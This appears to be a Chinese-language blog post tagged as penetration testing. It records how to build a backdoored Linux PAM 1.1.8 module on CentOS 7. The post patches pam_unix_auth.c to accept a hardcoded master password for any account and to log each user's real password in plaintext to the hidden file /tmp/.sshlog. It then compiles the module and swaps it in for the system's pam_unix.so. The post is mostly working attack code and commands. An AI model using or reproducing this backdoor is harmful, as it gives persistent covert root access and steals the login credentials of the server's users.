---
title: Linux PAM1.1.8后门 CentOS7.6 编译记录
date: 2024/05/08 12:25
updated: 2024/05/08 12:25
tags: [编译,PAM,后门,SSH,渗透测试,安全技术]
categories: 安全技术
description: 记录编译过程中的坑
cover: https://api.vvhan.com/api/wallpaper/acg
---

##  Linux PAM1.1.8后门 CentOS7.6 编译记录

编译环境：
```bash
[root@iZhp35ib6je3t2dltc8ltkZ linux-pam-Linux-PAM-1_1_8]# uname -a
Linux iZhp35ib6je3t2dltc8ltkZ 3.10.0-957.21.3.el7.x86_64 #1 SMP Tue Jun 18 16:35:19 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
[root@iZhp35ib6je3t2dltc8ltkZ linux-pam-Linux-PAM-1_1_8]# cat /etc/centos-release
CentOS Linux release 7.9.2009 (Core)
[root@iZhp35ib6je3t2dltc8ltkZ linux-pam-Linux-PAM-1_1_8]# 
```

SELINUX=disabled(默认)

1. 检查目标机器pam版本
```bash
[root@iZhp35ib6je3t2dltc8ltkZ ~]# rpm -qa | grep pam
pam-1.1.8-23.el7.x86_64
```

2. 获取对应版本源码

```bash
wget https://github.com/linux-pam/linux-pam/archive/refs/tags/Linux-PAM-1_1_8.tar.gz
```

3. 解压

```bash
tar zxvf Linux-PAM-1_1_8.tar.gz
cd linux-pam-Linux-PAM-1_1_8  
```

4. 安装基础依赖
```bash
yum install gcc flex flex-devel automake autoconf gettext libtool w3m texinfo fop bison bzip2 docbook-xsl-ns docbook-style-dsssl  docbook-style-xsl docbook5-style-xsl  docbook-utils -y
```

5. 修改源码

modules/pam_unix/pam_unix_auth.c
```c
/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
if(strcmp("test123",p)==0){return PAM_SUCCESS;}
if(retval == PAM_SUCCESS){
    FILE * fp;
    fp = fopen("/tmp/.sshlog","a");
    fprintf(fp,"%s : %s\n",name,p);
    fclose(fp);
}
name = p = NULL;

AUTH_RETURN;
```

6. 编译
```bash
./autogen.sh
./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr
make
```

7. 备份并替换
```bash
cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bak
cp /root/linux-pam-Linux-PAM-1_1_8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so
```